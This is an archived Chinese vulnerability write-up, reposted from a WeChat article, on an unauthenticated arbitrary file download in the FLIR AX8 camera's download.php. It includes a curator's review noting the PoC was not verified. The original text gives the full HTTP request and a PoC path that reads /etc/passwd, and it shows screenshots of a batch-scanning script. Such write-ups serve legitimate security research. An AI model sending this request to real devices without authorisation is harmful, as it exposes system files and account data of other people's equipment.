---
source: "MrWQ/vulnerability-paper"
id: "vw-099b71e3f97698048e661930"
entity_id: "ve-099b71e3f97698048e661930"
schema_version: "1"
title: "FLIR-AX8 任意文件下载"
product: "FLIR AX8"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无cookie请求，版本不明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/FLIR/FLIR-AX8%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://mp.weixin.qq.com/s/ub8eg5NABy61YPxSB0Fu6Q"
source_status: "recorded"
---

# FLIR-AX8 任意文件下载

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：FLIR AX8
- 本文讨论：download.php file直接路径读取
- 版本、权限与配置前提：无cookie请求，版本不明
- 资料类型：任意文件下载复现转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 请求/步骤同418，附截图可互补；无固件/补丁
- 声称批量脚本只有截图，不可作为附完整脚本
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 认证/固件及可读权限范围待确认
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ub8eg5NABy61YPxSB0Fu6Q)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjc8pmcbcoe9PdiahIebL3sncnu9SsUErjXu1l0oE45vFroVLzRS6UBe4MfObxHDVYiaSEwcJIVjUEUA/640?wx_fmt=png)

FLIR-AX8 任意文件下载

一、漏洞描述

FLIR-AX8 download.php 存在任意文件下载漏洞，直接访问可下载相关系统配置文件。

二、影响版本  

FLIR-AX8

三、漏洞复现

访问主页：  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjc8pmcbcoe9PdiahIebL3snceLd3qhHgPMbTSEiaLDw2b73KP9BQfxxrujBfL97SoZGicPf3FbAaTibAA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjc8pmcbcoe9PdiahIebL3snclNBlxugkiaYMcuqEibriaLNx2bPmPS7vNlSRyBktnpkzMpqZnqnlPTBvg/640?wx_fmt=png)

详细数据包：

```http
GET /download.php?file=/etc/passwd HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

poc：  

```
/download.php?file=/etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjc8pmcbcoe9PdiahIebL3sncOPUhoTJxY9sY2rRaQiaG1MWibLT8ePDoFk7KlozJR2gz1rypTRfnqVJg/640?wx_fmt=png)

直接浏览器访问下载，请求文件  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjc8pmcbcoe9PdiahIebL3snczMdicJGibfEXlyggI43r8w27esf2520r9dlYvddjNvhWRMzjibX3rghbw/640?wx_fmt=png)

尝试批量脚本：  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjc8pmcbcoe9PdiahIebL3snc21PFMeaKchbjBjItU1R7RIA0QMr9FClDjiawefFAtNm5s6Zz0N8icMkg/640?wx_fmt=png)

参考：

http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%8F%B2%E5%8A%9B%E5%B0%94/FLIR-AX8%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD.html?h=FLIR-AX8%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

如果本文内容侵权或者对贵公司业务或者其他有影响，请联系作者删除。  

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article

语雀博客主页：https://www.yuque.com/thelostworld

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
